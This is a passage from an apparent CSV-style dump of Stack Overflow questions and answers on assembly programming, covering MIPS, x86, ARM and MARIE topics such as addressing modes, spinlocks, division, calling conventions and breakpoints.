<p>P.S. I also don't know how to translate RETN. how to do it? The cheatsheet doesn't have such things:(</p>
","<pre><code>MOV     EAX, DWORD PTR SS:[EBP+8h]
</code></pre>

<p>is equivalent to</p>

<pre><code>movl %ss:8(%ebp), %eax
</code></pre>

<p>You just swap the order of the source and destination, the <code>DWORD</code> translates to an <code>l</code> suffix. The <code>%ss:</code> prefix is strictly unnecessary, it's the default when using <code>EBP</code> based memory access.</p>
","6161067"
"How to increment the address in MIPS assembly?","10074","","<p>I am just starting to lean MIPS assembly, and I am trying to write a simple <code>while</code> loop. It will be equivilent to the C code:</p>

<p><code>int A[5];</code></p>

<p><code>for(i=0;i&lt;5;i++) A[i]=i;</code></p>

<p>So I know I can use <code>beq</code> to make a <code>while</code> loop, but I don't know how to increment the memory address each time to go to the next register. I think maybe the <code>slt</code> operand may be useful, but I don't know.</p>
","<p>assuming $3 points to A[]</p>

<pre><code>lis $4
.word 4
lis $5
.word 1
add $7, $4, $5 ;$7 = 5
add $6, $0, $0 ;$6 = 0

loop:
sw $6, 0($3)
add $3, $4, $3 ;point to next ""int""
add $6, $5, $6 ;add 1 to our counter
bne $7, $6, loop ;we will stop at 5
</code></pre>
","775681"
"Difference between register indirect and base plus offset in MIPS addressing mode?","10034","","<p>What is the difference between <em>register indirect</em> and <em>base plus offset</em>, and how does it affect how you write assembly on the MIPS architecture? I think it means that you can only reference the register in an instruction, and that register has to point to more instructions?</p>
","<p>""Register indirect"" addressing means that the address which will be used by the
instruction (known as the ""effective address"") is taken from the contents of a
register, rather than being encoded directly within the instruction itself
(which is ""absolute"" addressing).  MIPS has jump instructions for both of these
addressing modes:</p>

<pre><code>j 0x1234
</code></pre>

<p>means ""jump to address <code>0x1234</code>"" (absolute addressing), whereas</p>

<pre><code>jr $ra
</code></pre>

<p>means ""jump to the address contained in the <code>$ra</code> register"" (register indirect
addressing).</p>

<p>""Base plus offset"" addressing means that a base address is taken from the
contents of a register, and then an offset (which is encoded in the instruction
itself) is added.  MIPS uses this addressing mode for loads and stores.  For
example:</p>

<pre><code>lw $t0, 0($a0)
lw $t1, 4($a0)
</code></pre>

<p>...if <code>$a0</code> contains <code>0x1234</code>, then <code>$t0</code> will be loaded with the word at
address <code>0x1234</code> (the effective address is the contents of the register, plus
an offset of 0), and <code>$t1</code> will be loaded with the word at address <code>0x1238</code>
(the effective address is the contents of the register, plus an offset of 4).</p>

<p>As you can see, when the offset is 0, this is equivalent to register indirect
addressing.</p>
","8160610"
"How to use C defines in ARM assembler","10017","","<p>How can I use external defines such as LONG_MIN and LONG_MAX in ARM assembler code?</p>

<p>Let's say my_arm.h looks like this:</p>

<pre><code>int my_arm(int foo);
</code></pre>

<p>Let's say I have a my_main.c as follows:</p>

<pre><code>...
#include &lt;limits.h&gt;   
#include ""my_arm.h""
...
int main (int argc, char *argv[])
{
  int foo=0;
...
  printf(""My arm assembler function returns (%d)\n"", my_arm(foo));
...
}
</code></pre>

<p>And my_arm.s looks like this:</p>

<pre><code>  .text
  .align 2
  .global my_arm
  .type   my_arm, %function
my_arm:
    ...
    ADDS r1, r1, r2
    BVS overflow
    ...
overflow: 
    LDR r0, LONG_MAX @ this is probably wrong, how to do it correctly?
    BX lr @ return with max value
</code></pre>

<p>The second to last line, I am not sure how to load correctly, I vaguely remember reading somewhere, that I had to define LONG_MAX in .global, but can't find the link to a working example anymore.</p>

<p>I am compiling with arm-linux-gnueabi-gcc version 4.3.2</p>

<p>==================</p>

<p>UPDATE: Appreciate the suggestions! Unfortunately, I am still having trouble with syntax.</p>

<p>First, I made a little header file mylimits.h (for now in same dir as .S)</p>

<pre><code>#define MY_LONG_MIN 0x80000000
</code></pre>

<p>in my_arm.S i added the following:</p>

<pre><code>...
.include ""mylimits.h""
...
ldr r7, =MY_LONG_MIN @ when it was working it was ldr r7, =0x80000000
...
</code></pre>

<p>Two problems with this approach.</p>

<p>First the biggest problem: the symbol MY_LONG_MIN is not recognized...so something is still not right</p>

<p>Second: syntax for .include does not let me include <code>&lt;limits.h&gt;</code>, I would have to add that in mylimits.h, seems a bit kludgy, but I suppose, that is ok :)</p>

<p>Any pointers?</p>

<p>I have access to      ARM System Developer’s Guide Designing and Optimizing System Software[2004] and ARM Architecture
Reference Manual[2000], my target is XScale-IXP42x Family rev 2 (v5l) though.</p>
","<p>Often the lowercase file extension <code>.s</code> implies that assembler should not be passed through the c preprocessor, whereas the uppercase extension <code>.S</code> implies that it should.
It's up to your compiler to follow this convention though (gcc ports normally do), so check its documentation.</p>

<p>(EDIT: note that this means you can use #include directives - but remember that most of the files you would include would not normally be valid assembler (unless they consist entirely of <code>#define</code>itions), so you may have to write your own header that is)</p>

<hr>

<p>edit 5 years later:</p>

<p>Note that the armcc v5 compiler follows this behaviour under linux... but not on windows.</p>
","3076079"
"x86 spinlock using cmpxchg","10002","","<p>I'm new to using gcc inline assembly, and was wondering if, on an x86 multi-core machine, a spinlock (without race conditions) could be implemented as (using AT&amp;T syntax):</p>

<pre>
spin_lock:
mov 0 eax
lock cmpxchg 1 [lock_addr]
jnz spin_lock
ret

spin_unlock:
lock mov 0 [lock_addr]
ret
</pre>
","<p>You have the right idea, but your asm is broken:</p>

<p><code>cmpxchg</code> can't work with an immediate operand, only registers.</p>

<p><code>lock</code> is not a valid prefix for <code>mov</code>.  <code>mov</code> to an aligned address is atomic on x86, so you don't need <code>lock</code> anyway.</p>

<p>It has been some time since I've used AT&amp;T syntax, hope I remembered everything:</p>

<pre><code>spin_lock:
xorl %ecx, %ecx
incl %ecx
spin_lock_retry:
xorl %eax, %eax
lock; cmpxchgl %ecx, (lock_addr)
jnz spin_lock_retry
ret

spin_unlock:
movl $0 (lock_addr)
ret
</code></pre>

<p>Note that GCC has atomic builtins, so you don't actually need to use inline asm to accomplish this:</p>

<pre><code>void spin_lock(int *p)
{
    while(!__sync_bool_compare_and_swap(p, 0, 1));
}

void spin_unlock(int volatile *p)
{
    asm volatile (""""); // acts as a memory barrier.
    *p = 0;
}
</code></pre>

<p>As Bo says below, locked instructions incur a cost: every one you use must flush your cache and lock your system's memory bus, which can be quite expensive if you've got enough CPUs. Even without many CPUs, it's still easy and worth it to optimize around:</p>

<pre><code>void spin_lock(int volatile *p)
{
    while(!__sync_bool_compare_and_swap(p, 0, 1))
    {
        while(*p) _mm_pause();
    }
}
</code></pre>

<p>The <code>pause</code> instruction is vital for performance on HyperThreading CPUs when you've got code that spins like this -- it lets the second thread execute while the first thread is spinning. On CPUs which don't support <code>pause</code>, it is treated as a <code>nop</code>.</p>
","6935581"
"Printing Hexadecimal Digits with Assembly","9989","","<p>I'm trying to learn NASM assembly, but I seem to be struggling with what seems to simply in high level languages.</p>

<p>All of the textbooks which I am using discuss using strings -- in fact, that seems to be one of their favorite things. Printing hello world, changing from uppercase to lowercase, etc.</p>

<p>However, I'm trying to understand how to increment and print hexadecimal digits in NASM assembly and don't know how to proceed. For instance, if I want to print #1 - n in Hex, how would I do so without the use of C libraries (which all references I have been able to find use)?</p>

<p>My main idea would be to have a variable in the .data section which I would continue to increment. But how do I extract the hexadecimal value from this location? I seem to need to convert it to a string first...?</p>

<p>Any advice or sample code would be appreciated.</p>
","<p>First write a simple routine which takes a nybble value (0..15) as input and outputs a hex character ('0'..'9','A'..'F').</p>

<p>Next write a routine which takes a byte value as input and then calls the above routine twice  to output 2 hex characters, i.e. one for each nybble.</p>

<p>Finally, for an N byte integer you need a routine which calls this second routine N times, once for each byte.</p>

<p>You might find it helpful to express this in pseudo code or an HLL such as C first, then think about how to translate this into asm, e.g.</p>

<pre><code>void print_nybble(uint8_t n)
{
    if (n &lt; 10) // handle '0' .. '9'
        putchar(n + '0');
    else // handle 'A'..'F'
        putchar(n - 10 + 'A');
}

void print_byte(uint8_t n)
{
    print_nybble(n &gt;&gt; 4); // print hi nybble
    print_nybble(n &amp; 15); // print lo nybble
}

print_int16(uint16_t n)
{
    print_byte(n &gt;&gt; 8); // print hi byte
    print_byte(n &amp; 255); // print lo byte
}
</code></pre>
","3853792"
"8086 assembly - how to access array elements within a loop","9977","","<p>Ok, to make things as simple as possible, say I have a basic loop that i want to use in order to modify some elements of an array labeled a. In the following sample code I've tried replacing all elements of a with 1, but that doesn't really work.</p>

<pre><code>assume cs:code ,ds:data
data segment
  a db 1,2,3,4
  i db 0
data ends

code segment
start:
  mov ax,data
  mov ds,ax

  lea si,a

  the_loop:
    mov cl,i
    cmp cl,4
    jae the_end

    mov ds:si[i],1      ; this is the part that i don't really understand since
    inc i               ; i'm expecting i=0 and ds:si[i] equiv to ds:si[0] which
  loop the_loop         ; is apparently not the case here since i actually receives the
                        ; the value 1
  the_end:
    mov ax,4c00h
    int 21h
code ends
end start
</code></pre>

<p>I am aware that I could simply do this by modifying the element stored in <code>al</code> after the <code>lodsb</code> instruction, and just store that. But I would like to know if it is possible to do something like what I've tried above.</p>
","<p>In x86 assembly you can't use a value stored to a memory to address memory indirectly.</p>

<p>You need to read <code>i</code> into some register that can be used for memory addressing, and use that instead. You may want to check <a href=""http://en.wikipedia.org/wiki/X86_architecture#Addressing_modes"" rel=""nofollow"">Wikipedia for 8086 memory addressing modes</a>.</p>

<p>So, replace </p>

<pre><code>mov ds:si[i],1
</code></pre>

<p>with (segment <code>ds</code> is unnecessary here, as it's the default of <code>si</code>, <code>bx</code> and <code>bx+si</code> too):</p>

<pre><code>xor bx,bx
mov bl,[i]
mov [bx+si],byte 1 ; some other assemblers want byte ptr
</code></pre>

<p>There are other problems with your code too. The entire loop can be made easier and fixed this way:</p>

<pre><code>    lea  si,a

    xor  cx,cx
    mov  cl,[i]

@fill_loop:
    mov  [si], byte 1
    inc  si
    dec  cx
    jnz  @fill_loop
</code></pre>

<p>Or, if you want to save 1 byte and use <code>loop</code> instruction.</p>

<pre><code> @fill_loop:
    mov  [si], byte 1
    inc  si
    loop @fill_loop
</code></pre>

<p>Note that in 16-bit mode <code>loop</code> instruction decrements <code>cx</code> and jumps to label if <code>cx</code> is not zero after decrement. However, in 32-bit mode <code>loop</code> decrements <code>ecx</code> and in 64-bit mode  (x86-64) it decrements <code>rcx</code>.</p>
","14980381"
"Accessing Specific Memory Locations in C","9972","","<p>In Assembly language we have instructions like </p>

<pre><code>Movl AX, [1000]
</code></pre>

<p>which allows us to access specific memory locations.</p>

<p>But in C can we do something similar to this?</p>

<p>Of course I know inline assembly code using <strong>asm()</strong> will allow you to do this.</p>

<p>But I would like to know about some C specific technique to achieve this.</p>

<p>I tried the following code and got segmentation error</p>

<pre><code>int *ptr=0xFE1DB124; 
</code></pre>

<p>This again was confusing as the memory location was identified by the code given below,</p>

<pre><code>int var;
printf(""\nThe Address is %x"",&amp;var);
</code></pre>

<p>So the memory location is available, but still I am getting segmentation fault.</p>
","<p>Common C compilers will allow you to set a pointer from an integer and to access memory with that, and they will give you the expected results. However, this is an extension beyond the C standard, so you should check your compiler documentation to ensure it supports it. This feature is not uncommonly used in kernel code that must access memory at specific addresses. It is generally not useful in user programs.</p>

<p>As comments have mentioned, one problem you may be having is that your operating system loads programs into a randomized location each time a program is loaded. Therefore, the address you discover on one run will not be the address used in another run. Also, changing the source and recompiling may yield different addresses.</p>

<p>To demonstrate that you can use a pointer to access an address specified numerically, you can retrieve the address and use it within a single program execution:</p>

<pre><code>#include &lt;inttypes.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;


int main(void)
{
    //  Create an int.
    int x = 0;

    //  Find its address.
    char buf[100];
    sprintf(buf, ""%"" PRIuPTR, (uintptr_t) &amp;x);
    printf(""The address of x is %s.\n"", buf);

    //  Read the address.
    uintptr_t u;
    sscanf(buf, ""%"" SCNuPTR, &amp;u);

    //  Convert the integer value to an address.
    int *p = (int *) u;

    //  Modify the int through the new pointer.
    *p = 123;

    //  Display the int.
    printf(""x = %d\n"", x);

    return 0;
}
</code></pre>

<p>Obviously, this is not useful in a normal program; it is just a demonstration. You would use this sort of behavior only when you have a special need to access certain addresses.</p>
","15638857"
"Skipcond in MARIE Assembly Language","9959","","<p>I have the following code:</p>

<pre><code>      ORG    100      
LOOP, Load   X
      Add    Z
      Store  X
      Load   Y
      Skipcond 400
      Jump   Q
      Subt   Z
      Store  Y
      Jump   LOOP
Q,    Output X
      Halt
X,    Dec    0
Y,    Dec    10
Z,    Dec    1
</code></pre>

<p>Now if I understand it correctly, it would be somewhat equivalent to the following Python code:</p>

<pre><code>x = 0
y = 10
z = 1
while True:
    x += z
    if y &gt; 0:
        y -= 1
    else:
        exit(0)
</code></pre>

<p>If that's the case, I'm confused why X = 10 in MARIE and X = 11 in Python upon completion of the looping process. From what I understand in the MARIE code, the skipcond 400 is equivalent to if y > 0. If that's the case, then when x = 10, y = 1 and it will still pass the skipcond to subtract 1 from y and therefore restart the loop and add 1 to x again meaning x = 11 when the loop ends and the data is outputed.</p>

<p>Some help understanding this would be greatly appreciated, thank you.   </p>
","<p>Your <code>SKIPCOND</code> is ""inverted"". Condition 400 means <a href=""http://www.edwardbosworth.com/CPSC2105/Lectures/Slides_05/Chapter_04/MARIE_Organization.htm"" rel=""nofollow"">skip if AC==0</a>. So this code:</p>

<pre><code>  Load   Y
  Skipcond 400
  Jump   Q
</code></pre>

<p>Will in effect do:</p>

<pre><code>IF (Y != 0) GOTO Q
</code></pre>

<p>which seems like the opposite of what you want to do. What you probably want is <code>SKIPCOND 800</code> (skip if AC > 0). </p>
","15782753"
"MIPS : Storing integers or integer arrays as local variables","9949","","<p>In a problem, I have been asked to use the concept of assigning integer variables as local variables in MIPS assembly language.
which is. Write a program which
(i) reads an integer in a local variable ""inp"" (with proper prompt)</p>

<p>What actually is meant by this assigning integer variables as local variables? and how do i go about this problem?</p>
","<p>Read through the following <a href=""http://logos.cs.uic.edu/366/notes/mips%20quick%20tutorial.htm"" rel=""nofollow"">tutorial</a>.  Part of this exercise is just invoking the right system routine:</p>

<blockquote>
  <p>The read_int, read_float and read_double services read an entire line
  of input up to and including the newline character.</p>
</blockquote>

<p>As far as your question goes, it just means read the value the user enters into a variable (perhaps a register or a temp variable in your case).</p>

<p><strong>Read integer value, store in RAM location with label int_value (presumably declared in data section)</strong></p>

<pre><code>    li  $v0, 5            # load appropriate system call code into register $v0;
                          # code for reading integer is 5
    syscall               # call operating system to perform operation
    sw  $v0, int_value    # value read from keyboard returned in register $v0;
                          # store this in desired location
</code></pre>
","11789411"
"What registers are preserved through a linux x86-64 function call","9938","","<p>I believe I understand how the linux x86-64 ABI uses registers and stack to pass parameters to a function (cf. <a href=""https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64/2538212#2538212"">previous ABI discussion</a>). What I'm confused about is if/what registers are expected to be preserved across a function call. That is, what registers are guarenteed not to get clobbered?</p>
","<p>Here's the complete table of registers and their use from the documentation [<a href=""http://www.uclibc.org/docs/psABI-x86_64.pdf"" rel=""noreferrer"">PDF Link</a>]:</p>

<p><img src=""https://i.stack.imgur.com/WgcQv.png"" alt=""table from docs""></p>

<p><code>r12</code>, <code>r13</code>, <code>r14</code>, <code>r15</code>, <code>rbx</code>, <code>rsp</code>, <code>rbp</code> are the callee-saved registers - they have a ""Yes"" in the ""Preserved across function calls"" column.</p>
","18024743"
"MIPS Assembly Branch If Less Than","9924","","<p>I've been working on a very basic MIPS program that computes some stuff on ticket sales. I have all the functionality implemented, but when I do my IF statements (blt --> branch if less than) I am running into some errors. I have the following data stored in temporary registers:</p>

<pre><code>- $t0 = # of VIP tickets.
- $t1 = # of General Admission tickets.
- $t2 = # of Box Office tickets.
- $t4 = Average ticket sales.
</code></pre>

<p>I have checked that the values are stored accordingly and the code does work if the condition is FALSE, but if the condition is met it will branch and still print the code before the branch. Here is part of my code: </p>

<pre><code>  blt $t0, $t4, VIP_LESS  # if $t0 &lt; $t4 then VIP
  b VIP_GREAT
  VIP_LESS:
    li $v0, 4
    la $a0, less_avg_vip
    syscall 
  VIP_GREAT:
    li $v0, 4
    la $a0, great_avg_vip
    syscall 
  blt $t1, $t4, GEN_LESS # if $t1 &lt; $t4 then GEN
  b GEN_GREAT
  GEN_LESS:
    li $v0, 4
    la $a0, less_avg_general
    syscall
  GEN_GREAT:
    li $v0, 4
    la $a0, great_avg_general
    syscall 
  blt $t2, $t4, BOX_LESS  # if $t2 &lt; $t4 then BOX_LESS
  b BOX_GREAT
  BOX_LESS:
    li $v0, 4
    la $a0, less_avg_box
    syscall 
  BOX_GREAT:
    li $v0, 4
    la $a0, great_avg_box
    syscall 
  li $v0, 4
  la $a0, endl
  syscall
</code></pre>

<p>Can anyone see why I am getting a problem with this? The output of my program looks something like this:</p>

<pre><code>VIP: 1349 tickets
General: 5278 tickets
Box: 4367 tickets

Average: 3215 tickets

VIP: Less than average.
General: Greater than average.
General: Less than average.
Box: Greater than average.
Box: Less than average.
</code></pre>

<p>EDIT: working code.</p>

<pre><code> blt $t0, $t4, VIP_LESS  # if $t0 &lt; $t4 then VIP
  li $v0, 4
  la $a0, great_avg_vip
  syscall
  j GENERAL_IF
  VIP_LESS:
    li $v0, 4
    la $a0, less_avg_vip
    syscall 
  GENERAL_IF: 
    blt $t1, $t4, GEN_LESS # if $t1 &lt; $t4 then GEN
    li $v0, 4
    la $a0, great_avg_general
    syscall 
    j BOX_IF
    GEN_LESS:
      li $v0, 4
      la $a0, less_avg_general
      syscall
  BOX_IF:
    blt $t2, $t4, BOX_LESS  # if $t2 &lt; $t4 then BOX_LESS
    li $v0, 4
    la $a0, great_avg_box
    syscall 
    j END_IF
    BOX_LESS:
      li $v0, 4
      la $a0, less_avg_box
      syscall 
  END_IF:
    li $v0, 4
    la $a0, endl
    syscall 
</code></pre>
","<p>You just need some unconditional branches so that you don't execute both the ""greater than"" and ""less than"" code paths, e.g.</p>

<pre><code>  blt $t0, $t4, VIP_LESS  # if $t0 &lt; $t4 then VIP
  li $v0, 4
  la $a0, great_avg_vip
  syscall 
                &lt;&lt;&lt; you need an unconditional branch here to VIP_GE
  VIP_LESS:
    li $v0, 4
    la $a0, less_avg_vip
    syscall 
    xor $a0, $a0, $a0
  VIP_GE:       &lt;&lt;&lt; label here so that you can skip previous block
  ...
</code></pre>

<p>You need to do this for each of your three if/else blocks.</p>
","13729450"
"What is the difference between '__asm' and '__asm__'?","9894","","<p>I am learning inline assembly in C. As far as I can tell, the only difference between <code>__asm { ... };</code> and <code>__asm__(""..."");</code> is that the first uses <code>mov eax, var</code> and the second uses <code>movl %0, %%eax</code> with <code>:""=r"" (var)</code> at the end. Also, there are a lot less websites about the first. What other differences are there?</p>
","<p>Which one you use depends on your compiler.  This isn't standard like the C language.</p>
","3323452"
"X86 assembly - Handling the IDIV instruction","9875","","<p>I am currently writing a simple C compiler, that takes a .c file as input and generates assembly code (X86, AT&amp;T syntax).
Everyting is good, but when I try to execute a IDIVQ instruction, I get a floating-point exception. Here's my input:</p>

<pre><code>int mymain(int x){
  int d;
  int e;
  d = 3;
  e = 6 / d;
  return e;
}
</code></pre>

<p>And here is my generated code:</p>

<pre><code>mymain:
.LFB1:
    .cfi_startproc
    pushq   %rbp
    .cfi_def_cfa_offset 16
    movq    %rsp, %rbp
    .cfi_offset 6, -16
    .cfi_def_cfa_register 6
    movq    %rdi, -40(%rbp)
    movq    $3, -8(%rbp)
    movq    $6, %rax
    movq    -8(%rbp), %rdx
    movq    %rdx, %rbx
    idivq   %rbx
    movq    %rax, -16(%rbp)
    movq    -16(%rbp), %rax
    leave
    .cfi_def_cfa 7, 8
    ret
    .cfi_endproc
.LFE1:
    .size mymain, .-mymain
</code></pre>

<p>According to <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"">http://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a>, <strong>idivq %rbx</strong> should produce 6/d (the quotient) in <strong>%rax</strong>. But I'm getting a floating-point exception, and I can't seem to find the problem.</p>

<p>Any help will be much appreciated!</p>
","<p>The first part of Mysticials answer is correct, <code>idiv</code> does a 128/64 bit division, so the value of <code>rdx</code>, which holds the upper 64 bit from the dividend must not contain a random value. But a zero extension is the wrong way to go.</p>

<p>As you have <em>signed</em> variables, you need to <em>sign</em> extend <code>rax</code> to <code>rdx:rax</code>. There is a specific instruction for this, <code>cqto</code> (<em>convert quad to oct</em>) in AT&amp;T and <code>cqo</code> in Intel syntax. AFAIK newer versions of gas accept both names.</p>

<pre><code>movq    %rdx, %rbx
cqto                  # sign extend rax to rdx:rax
idivq   %rbx
</code></pre>
","10348927"
"x86_64 ASM - maximum bytes for an instruction?","9874","","<p>What is the maximum number of bytes a complete instruction would require in x64 asm code?</p>

<p>Something like a jump to address might occupy up to 9 bytes I suppose: <strong>FF 00 00 00 00 11 12 3F 1F</strong> but I don't know if that's the maximum number of bytes a x64 instruction can use</p>
","<p>The x86 instruction set (16, 32 or 64 bit, all variants/modes) guarantees / requires that instructions are at most 15 bytes. Anything beyond that will give an ""invalid opcode"". You can't achieve that without using redundant prefixes (e.g. multiple 0x66 or 0x67 prefixes, for example).</p>

<p>The only instruction that actually takes 64-bits as a data item is the load constant to register (Intel syntax: <code>mov reg, 12345678ABCDEF00h</code>, at&amp;t syntax: <code>movabs $12345678ABCDEF00, %reg</code>) - so if you wanted to jump more than 31 bits forward/backward, it would be a move of the target location into a register, and then call/jump to the register.  Using 32-bit immediates and displacements (in relative jumps and addressing modes) saves four bytes on many instructions in 64-bit mode.</p>
","14698559"
"Why does int 3 generate a SIGSEGV in 64-bit instead of stopping the debugger?","9866","","<p>In 32 bits mode programming I used to employ <code>int 3</code> in my programs a lot for stopping at a given location with the debugger (embedding the instruction in the source). Now in 64 bits it seems to not be working, producing a very ordinary SIGSEGV under gdb and destroying the program beyond hope (""Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.""). I wonder if 64 bit mode has another mechanism, or if I should do some cache-flush (the <code>int 3</code> is a dynamically generated opcode in this case (0xcc), is some jit-like code).</p>
","<p>BarsMonster's answer shows that <code>__asm__(""int3"");</code> will not work on 64 bit platforms. This is - at least today (2014) - not true.</p>

<p>The following code will work on an <code>amd64</code> platform:</p>

<p><em>breakpoint.c</em></p>

<pre><code>int main() {
    int i;     
    for(i=0; i&lt;3;i++) {
        __asm__(""int3"");
    }
}
</code></pre>

<p>Compile it trivially: <code>gcc -c breakpoint.c</code> and start <code>gdb a.out</code>:</p>

<pre><code>(gdb) run
Starting program: /tmp/a.out 

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00000000004004fb in main ()
</code></pre>

<p>You see, gdb stops at the breakpoint.</p>
","25436272"
"What should I know when switching from MIPS to x86 assembly?","9818","","<p>At school we have been programming in MIPS assembly language for some time.  I'm interested into delving into x86 assembly and I have heard that is somewhat harder (even my MIPS textbook says this).  </p>

<p>What core information should I know as a MIPS programmer before making the dive into the x86 world?</p>
","<p>The biggest things to keep in mind are:</p>

<ul>
<li>Few general purpose registers, and the ones you do have are not pure GP -- many instructions require you to use certain registers for a specific purpose.</li>
<li>x86 instructions are two-opcode form rather than three-opcode which can make certain operations more complex.  That is, instead of add r0, r1, r2 (r0 = r1 + r2), you do add eax, ebx (eax += ebx).</li>
<li>Segments in protected mode (all 32-bit code outside of DOS, effectively) make your memory addressing scheme extremely non-obvious, which can bite you in the ass when you're starting out.</li>
<li>You're going to be looking up the flags set/cleared by instructions all the time.  Learn to love the Intel manuals.</li>
<li>Edit, one thing I forgot:  The use of subregisters (e.g. ah to access the high 8 bits of the low 16-bits of the eax register) can make tracking manipulations to your registers very difficult.  Be careful and comment liberally until you get things down.</li>
</ul>

<p>Other than that, x86 is pretty straight forward.  When you learn to abuse instructions like 'lea' and 'test', you learn to love it.  Also, protip:  Intel will send you copies of the instruction set manuals for free, don't even have to pay for shipping.  Look around their site for the fulfillment email and request the books by SKU.</p>
","454114"
"Division and modulus using single divl instruction (i386, amd64)","9806","","<p>I was trying to come up with inline assembly for gcc to get both division and modulus using single <code>divl</code> instruction. Unfortunately, I am not that good at assembly. Could someone please help me on this? Thank you.</p>
","<p>Yes -- a divl will produce the quotient in eax and the remainder in edx. Using Intel syntax, for example:</p>

<pre><code>mov eax, 17
mov ebx, 3
xor edx, edx
div ebx
; eax = 5
; edx = 2
</code></pre>
","5608610"
"What is __i686.get_pc_thunk.bx? Why do we need this call?","9760","","<p>When I disassemble my small function, I happened to see this call</p>

<pre><code>call   0xf60d2f47 &lt;__i686.get_pc_thunk.bx&gt;.
</code></pre>

<p>I have no clue why I need this call in my program. Any explanation would be helpful. </p>
","<p>This call is used in position-independent code on x86.  It loads the position of the code into the <code>%ebx</code> register, which allows global objects (which have a fixed offset from the code) to be accessed as an offset from that register.</p>

<p>Position-independent code is code that can be loaded and executed, unmodified, at different addresses.  It is important for code that will be linked into shared libraries, because these can be mapped at a different address in different processes.</p>

<p>Note that an equivalent call is <em>not</em> required on x86-64, because that architecture has IP-relative addressing modes (that is, it can directly address memory locations as an offset from the location of the current instruction).</p>
","6680177"
"Why is a conditional move not vulnerable for Branch Prediction Failure?","9745","","<p>After reading <a href=""https://stackoverflow.com/a/11227902/155137"">this post (answer on StackOverflow)</a> (at the optimization section), I was wondering why conditional moves are not vulnerable for Branch Prediction Failure. I found on <a href=""http://www.cs.tufts.edu/comp/40/readings/amd-cmovcc.pdf"" rel=""noreferrer"">an article on cond moves here (PDF by AMD)</a>. Also there, they claim the performance advantage of cond. moves. But why is this? I don't see it. At the moment that that ASM-instruction is evaluated, the result of the preceding CMP instruction is not known yet.</p>

<p>Thanks.</p>
","<h2>Mis-predicted branches are expensive</h2>

<p>A modern processor generally executes between one and three instructions each cycle if things go well (if it does not stall waiting for data dependencies for these instructions to arrive from previous instructions or from memory).</p>

<p>The statement above holds surprisingly well for tight loops, but this shouldn't blind you to one additional dependency that can prevent an instruction to be executed when its cycle comes:
for an instruction to be executed, the processor must have started to fetch and decode it 15-20 cycles before.</p>

<p>What should the processor do when it encounters a branch? Fetching and decoding both targets does not scale (if more branches follow, an exponential number of paths would have to be fetched in parallel). So the processor only fetches and decodes one of the two branches, speculatively.</p>

<p>This is why mis-predicted branches are expensive: they cost the 15-20 cycles that are usually invisible because of an efficient instruction pipeline.</p>

<h2>Conditional move is never very expensive</h2>

<p>Conditional move does not require prediction, so it can never have this penalty. It has data dependencies, same as ordinary instructions. In fact, a conditional move has more data dependencies than ordinary instructions, because the data dependencies include both “condition true” and “condition false” cases. After an instruction that conditionally moves <code>r1</code> to <code>r2</code>, the contents of <code>r2</code> seem to depend on both the previous value of <code>r2</code> and on <code>r1</code>. A well-predicted conditional branch allows the processor to infer more accurate dependencies. But data dependencies typically take one-two cycles to arrive, if they need time to arrive at all.</p>

<p>Note that a conditional move from memory to register would sometimes be a dangerous bet: if the condition is such that the value read from memory is not assigned to the register, you have waited on memory for nothing. But the conditional move instructions offered in instruction sets are typically register to register, preventing this mistake on the part of the programmer.</p>
","14131292"
"Does using xor reg, reg give advantage over mov reg, 0?","9717","","<p>There're two well-known ways to set an integer register to zero value on x86.</p>

<p>Either</p>

<pre><code>mov reg, 0
</code></pre>

<p>or</p>

<pre><code>xor reg, reg
</code></pre>

<p>There's an opinion that the second variant is better since the value 0 is not stored in the code and that saves several bytes of produced machine code. This is definitely good - less instruction cache is used and this can sometimes allow for faster code execution. Many compilers produce such code.</p>

<p>However there's formally an inter-instruction dependency between the xor instruction and whatever earlier instruction that changes the same register. Since there's a depedency the latter instruction needs to wait until the former completes and this could reduce the processor units load and hurt performance.</p>

<pre><code>add reg, 17
;do something else with reg here
xor reg, reg
</code></pre>

<p>It's obvious that the result of xor will be exactly the same regardless of the initial register value. But it the processor able to recognize this?</p>

<p>I tried the following test in VC++7:</p>

<pre><code>const int Count = 10 * 1000 * 1000 * 1000;
int _tmain(int argc, _TCHAR* argv[])
{
    int i;
    DWORD start = GetTickCount();
    for( i = 0; i &lt; Count ; i++ ) {
        __asm {
            mov eax, 10
            xor eax, eax
        };
    }
    DWORD diff = GetTickCount() - start;
    start = GetTickCount();
    for( i = 0; i &lt; Count ; i++ ) {
        __asm {
            mov eax, 10
            mov eax, 0
        };
    }
    diff = GetTickCount() - start;
    return 0;
}
</code></pre>

<p>With optimizations off both loops take exactly the same time. Does this reasonably prove that the processor recognizes that there's no dependency of <code>xor reg, reg</code> instruction on the earlier <code>mov eax, 0</code> instruction? What could be a better test to check this?</p>
","<p>an actual answer for you:</p>

<p><a href=""http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf"" rel=""nofollow noreferrer"">Intel 64 and IA-32 Architectures Optimization Reference Manual</a></p>

<p>Section 3.5.1.8 is where you want to look.</p>

<p>In short there are situations where an xor or a mov may be preferred. The issues center around dependency chains and preservation of condition codes.</p>
","1135958"
"How to generate a nasm compilable assembly code from c source code on Linux?","9690","","<p>Test platform is 32 bit Linux.</p>

<p>Basically, I know gcc can be used to generate both Intel and At&amp;T style 
assembly code, but it seems that you <strong><em>can not</em></strong> directly use nasm/tasm to compile 
the Intel style assembly code gcc generated.</p>

<p>I am conducting a project analysis asm code on both windows and Linux platform, so I am thinking if they can be both compiled by platform independent assembler like nasm\yasm, I could have a much easier time...</p>

<p>So my question is how to generate a nasm compilable assembly code from c source code on Linux?</p>
","<p>I find it's a better approach to disassemble the object files rather than use assembly code generated by gcc.</p>

<ol>
<li><p>First, generate an object file from your source code:</p>

<pre><code>gcc -fno-asynchronous-unwind-tables -s -c -o main.o main.c
</code></pre>

<p><code>-fno-asynchronous-unwind-tables</code>: do not generate unnecessary sections like    <code>.eh_frame</code></p>

<p><code>-s</code>: make smaller executable (strip)</p>

<p><code>-c -o</code>: generate an object file called <code>main.o</code></p></li>
<li><p>Use <a href=""http://www.agner.org/optimize/"">objconv</a> to generate <code>nasm</code> code:</p>

